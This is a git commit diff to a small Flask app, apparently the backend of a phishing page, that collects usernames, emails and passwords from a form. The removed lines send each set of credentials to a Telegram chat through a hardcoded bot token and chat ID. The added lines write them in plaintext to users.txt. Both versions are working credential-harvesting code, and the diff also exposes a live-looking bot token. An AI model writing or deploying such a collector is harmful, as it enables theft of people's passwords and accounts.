2bb97daf74a80c48c63f42cb39593e5b65cb18bd
trickster0101010101 <135065829+trickster0101010101@users.noreply.github.com>
2023-06-04 03:50:14 +0300

    Add files via upload

--- index.py
+++ index.py
@@ -1,33 +1,20 @@
 from flask import Flask, request
-import requests
 
 app = Flask(__name__)
 
-# Замените на свои значения
-TOKEN = '6085931159:AAFjUMzs7bS6Wvkf-p4jxuDBUzNu09DZ-O8'
-CHAT_ID = '1129521727'
-
-@app.route('/index', methods=['POST'])
-def send_to_telegram():
+@app.route('/submit', methods=['POST'])
+def submit_form():
     username = request.form['username']
     mail = request.form['mail']
     password = request.form['password']
-    
-    # Формируем текст сообщения
-    message = f"Имя пользователя: {username}\nТелефон: {mail}\nПароль: {password}"
-    
-    # Отправляем сообщение в Telegram
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    data = {
-        'chat_id': CHAT_ID,
-        'text': message
-    }
-    response = requests.post(url, data=data)
-    
-    if response.ok:
-        return 'Данные отправлены в Telegram!'
-    else:
-        return 'Ошибка отправки данных в Telegram.'
+
+    with open('users.txt', 'a') as file:
+        file.write(f"Username: {username}\n")
+        file.write(f"Mail: {mail}\n")
+        file.write(f"Password: {password}\n")
+        file.write("--------------------\n")
+
+    return "Данные успешно отправлены и сохранены в файл 'users.txt'"
 
 if __name__ == '__main__':
     app.run()
